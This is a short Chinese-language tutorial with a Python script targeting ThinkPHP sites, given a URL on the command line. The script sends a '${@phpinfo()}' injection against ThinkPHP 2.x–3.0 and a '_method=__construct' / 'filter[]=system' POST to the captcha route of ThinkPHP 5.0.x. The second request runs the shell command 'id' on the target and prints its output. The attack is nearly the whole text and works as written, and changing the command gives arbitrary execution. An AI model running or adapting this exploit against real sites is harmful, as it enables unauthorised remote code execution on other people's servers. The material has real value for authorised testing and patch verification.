我们首先定义url

url = sys.argv[1] + '/index.php?s=/index/index/xxx/${@phpinfo()}'

sys.argv[1] 是获取cmd输入的一个参数也就是网站然后拼接在一起

res = requests.get(url)

import sys
import requests


# 2.x-3.0 rce
url = sys.argv[1] + '/index.php?s=/index/index/xxx/${@phpinfo()}'
res = requests.get(url)
if res.status_code == 200:
    print('存在2.x-3.0 rce')
    print(str(res.content,encoding="utf8"))
else:
    print('不存在2.x-3.0 rce')


# 5.0.0-5.0.0.23 rce
def check():
    url2 = sys.argv[1] + 'index.php?s=captcha'
    data = {
        '_method': '__construct',
        'filter[]': 'system',
        'method': 'get',
        'server[REQUEST_METHOD]': 'id'
    }
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/71.0.3578.98 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    }

    resp = requests.post(url2, data=data, headers=headers)
    result='uid'
    result2=bytes(result, encoding = "utf8")
    if resp.content.find(result2) != -1:
        return '存在thinkphp5.0 命令执行\n'+str(resp.content,encoding="utf8")
    else:
        return '不存在5.0rce'
print(check())
